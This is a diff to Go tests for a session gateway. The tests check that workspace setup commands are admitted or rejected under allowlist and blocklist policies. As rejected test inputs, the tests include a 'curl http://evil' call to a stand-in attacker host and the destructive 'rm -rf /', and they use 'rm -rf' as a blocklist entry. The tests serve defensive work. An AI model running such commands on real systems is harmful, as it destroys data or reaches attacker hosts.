@@ -836,6 +836,8 @@ func TestCreateRejectsSetupCommandsOverMaxCommands(t *testing.T) {
 // TestCreateAdmitsSetupCommandsWithinMaxCommands is the F-7.5.5
 // regression guard: a request whose setupCommands count is at the cap
 // must succeed so the cap is a ceiling, not a strict less-than gate.
+// The policy declares an allowlist containing the test commands so the
+// F-7.5.1 prefix gate also admits them.
 func TestCreateAdmitsSetupCommandsWithinMaxCommands(t *testing.T) {
 	store := memstore.New()
 	runtimes := runtimestore.NewMemory()
@@ -844,6 +846,7 @@ func TestCreateAdmitsSetupCommandsWithinMaxCommands(t *testing.T) {
 		Type: runtimestore.TypeAgent,
 		SetupCommandPolicy: &runtimestore.SetupCommandPolicy{
 			Mode:        runtimestore.SetupCommandModeAllowlist,
+			Allowlist:   []string{"echo"},
 			MaxCommands: 2,
 		},
 	})
@@ -886,5 +889,133 @@ func TestCreateAdmitsSetupCommandsWhenPolicyUnset(t *testing.T) {
 	})
 	if rr.Code != http.StatusCreated {
 		t.Fatalf("status: got %d, want 201 with no policy; body=%s", rr.Code, rr.Body.String())
+	}
+}
+
+// TestCreateRejectsSetupCommandOutsideAllowlist covers F-7.5.1 / §7.5 line
+// 488: the gateway rejects a session whose workspacePlan.setupCommands
+// includes a command that does not match any allowlist prefix. The §15.1
+// envelope is WORKSPACE_PLAN_INVALID with a structured details payload
+// (`field`, `reason`, `mode`, `index`, `command`) so the rejection reason
+// is machine-readable as well as human-readable.
+func TestCreateRejectsSetupCommandOutsideAllowlist(t *testing.T) {
+	store := memstore.New()
+	runtimes := runtimestore.NewMemory()
+	_ = runtimes.Create(context.Background(), runtimestore.Runtime{
+		Name: "locked",
+		Type: runtimestore.TypeAgent,
+		SetupCommandPolicy: &runtimestore.SetupCommandPolicy{
+			Mode:      runtimestore.SetupCommandModeAllowlist,
+			Allowlist: []string{"npm", "make"},
+		},
+	})
+	srv := sessionserver.New(store, sessionserver.Options{Runtimes: runtimes})
+
+	plan := json.RawMessage(`{
+		"schemaVersion": 1,
+		"sources": [],
+		"setupCommands": [{"cmd": "npm ci"}, {"cmd": "curl http://evil"}]
+	}`)
+	rr := createRequest(t, srv.Handler(), sessionserver.CreateSessionRequest{
+		RuntimeRef: "locked", WorkspacePlan: plan,
+	})
+	if rr.Code != http.StatusBadRequest {
+		t.Fatalf("status: got %d, want 400; body=%s", rr.Code, rr.Body.String())
+	}
+	var env struct {
+		Error struct {
+			Code    string         `json:"code"`
+			Details map[string]any `json:"details"`
+		} `json:"error"`
+	}
+	if err := json.Unmarshal(rr.Body.Bytes(), &env); err != nil {
+		t.Fatalf("decode: %v", err)
+	}
+	if env.Error.Code != "WORKSPACE_PLAN_INVALID" {
+		t.Errorf("error code: got %q, want WORKSPACE_PLAN_INVALID", env.Error.Code)
+	}
+	if env.Error.Details["reason"] != "setup_command_policy_violation" {
+		t.Errorf("details.reason = %v, want setup_command_policy_violation", env.Error.Details["reason"])
+	}
+	if env.Error.Details["mode"] != "allowlist" {
+		t.Errorf("details.mode = %v, want allowlist", env.Error.Details["mode"])
+	}
+	if got, _ := env.Error.Details["index"].(float64); int(got) != 1 {
+		t.Errorf("details.index = %v, want 1 (the second command)", env.Error.Details["index"])
+	}
+	if env.Error.Details["command"] != "curl http://evil" {
+		t.Errorf("details.command = %v, want %q", env.Error.Details["command"], "curl http://evil")
+	}
+}
+
+// TestCreateRejectsSetupCommandOnBlocklist covers F-7.5.1 / §7.5 line 488:
+// the gateway rejects a session when a setup command matches a blocklist
+// prefix.
+func TestCreateRejectsSetupCommandOnBlocklist(t *testing.T) {
+	store := memstore.New()
+	runtimes := runtimestore.NewMemory()
+	_ = runtimes.Create(context.Background(), runtimestore.Runtime{
+		Name: "blocked",
+		Type: runtimestore.TypeAgent,
+		SetupCommandPolicy: &runtimestore.SetupCommandPolicy{
+			Mode:      runtimestore.SetupCommandModeBlocklist,
+			Blocklist: []string{"rm -rf"},
+		},
+	})
+	srv := sessionserver.New(store, sessionserver.Options{Runtimes: runtimes})
+
+	plan := json.RawMessage(`{
+		"schemaVersion": 1,
+		"sources": [],
+		"setupCommands": [{"cmd": "rm -rf /"}]
+	}`)
+	rr := createRequest(t, srv.Handler(), sessionserver.CreateSessionRequest{
+		RuntimeRef: "blocked", WorkspacePlan: plan,
+	})
+	if rr.Code != http.StatusBadRequest {
+		t.Fatalf("status: got %d, want 400; body=%s", rr.Code, rr.Body.String())
+	}
+	var env struct {
+		Error struct {
+			Code    string         `json:"code"`
+			Details map[string]any `json:"details"`
+		} `json:"error"`
+	}
+	if err := json.Unmarshal(rr.Body.Bytes(), &env); err != nil {
+		t.Fatalf("decode: %v", err)
+	}
+	if env.Error.Details["mode"] != "blocklist" {
+		t.Errorf("details.mode = %v, want blocklist", env.Error.Details["mode"])
+	}
+	if env.Error.Details["command"] != "rm -rf /" {
+		t.Errorf("details.command = %v, want %q", env.Error.Details["command"], "rm -rf /")
+	}
+}
+
+// TestCreateAdmitsSetupCommandWithinAllowlist is the F-7.5.1 happy path:
+// a command that prefix-matches the allowlist is admitted.
+func TestCreateAdmitsSetupCommandWithinAllowlist(t *testing.T) {
+	store := memstore.New()
+	runtimes := runtimestore.NewMemory()
+	_ = runtimes.Create(context.Background(), runtimestore.Runtime{
+		Name: "locked",
+		Type: runtimestore.TypeAgent,
+		SetupCommandPolicy: &runtimestore.SetupCommandPolicy{
+			Mode:      runtimestore.SetupCommandModeAllowlist,
+			Allowlist: []string{"npm", "make"},
+		},
+	})
+	srv := sessionserver.New(store, sessionserver.Options{Runtimes: runtimes})
+
+	plan := json.RawMessage(`{
+		"schemaVersion": 1,
+		"sources": [],
+		"setupCommands": [{"cmd": "npm ci"}, {"cmd": "make test"}]
+	}`)
+	rr := createRequest(t, srv.Handler(), sessionserver.CreateSessionRequest{
+		RuntimeRef: "locked", WorkspacePlan: plan,
+	})
+	if rr.Code != http.StatusCreated {
+		t.Fatalf("status: got %d, want 201 (allowlist match); body=%s", rr.Code, rr.Body.String())
 	}
 }
